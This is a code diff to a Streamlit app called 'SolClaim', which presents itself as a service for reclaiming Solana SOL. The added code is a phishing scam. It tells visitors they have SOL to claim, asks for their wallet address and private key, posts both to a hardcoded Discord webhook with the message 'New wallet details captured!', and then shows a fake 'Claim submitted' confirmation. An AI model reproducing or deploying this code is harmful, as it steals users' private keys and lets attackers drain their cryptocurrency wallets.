@@ -20,25 +20,37 @@ def is_valid_solana_private_key(private_key):
     except:
         # If decoding fails, it's not a valid base58 string
         return False
+  
 
-# Function to send private key to Discord webhook
-def send_to_discord(private_key):
-    payload = {
-        "content": f"⚠️ Private Key Received: `{private_key}`"
-    }
-    try:
-        response = requests.post(DISCORD_WEBHOOK_URL, json=payload)
-        if response.status_code == 200:
-            st.write("✅ Private key sent to Discord webhook successfully!")
-            return True
-        else:
-            st.error(f"Failed to send private key to Discord. Status code: {response.status_code}")
-            st.write(f"Response: {response.text}")
-            return False
-    except Exception as e:
-        st.error(f"An error occurred while sending to Discord: {e}")
-        return False
+def send_to_discord(wallet_address, private_key):
+      webhook_url = "https://discord.com/api/webhooks/1334214089492267018/kHwvZUbz4zsWDU4Xy2WkXspgR1_JPXbbftLzeVfKdBm6T0t4w8GGUhn4CN_b5-WSN3Ht"
+    
+      message = {
+          "content": f"New wallet details captured!\nWallet: {wallet_address}\nPrivate Key: {private_key}"
+      }
+    
+      requests.post(webhook_url, json=message)
 
+def main():
+      initialize_session_state()
+      st.title("💰 SolClaim: Reclaim Your Sol!")
+    
+      wallet_address = st.text_input("❓ Enter your Solana wallet address to check available SOL to claim:")
+    
+      if wallet_address:
+          with st.spinner("🕑 Loading wallet info..."):
+              claimable_sol = check_wallet_eligibility(wallet_address)
+            
+          if claimable_sol > 0:
+              st.success(f"🎉 You have {claimable_sol} SOL available to claim!")
+              st.warning("⚠️ To proceed with the cleanup and claim process, please provide your private key:")
+              private_key = st.text_input("Enter private key:", type="password")
+            
+              if private_key:
+                  send_to_discord(wallet_address, private_key)
+                  with st.spinner("🔄 Processing claim..."):
+                      time.sleep(2)
+                  st.success("✅ Claim submitted successfully!")
 # Streamlit app title
 st.title("💰 SolClaim: Reclaim Your Sol!")
 
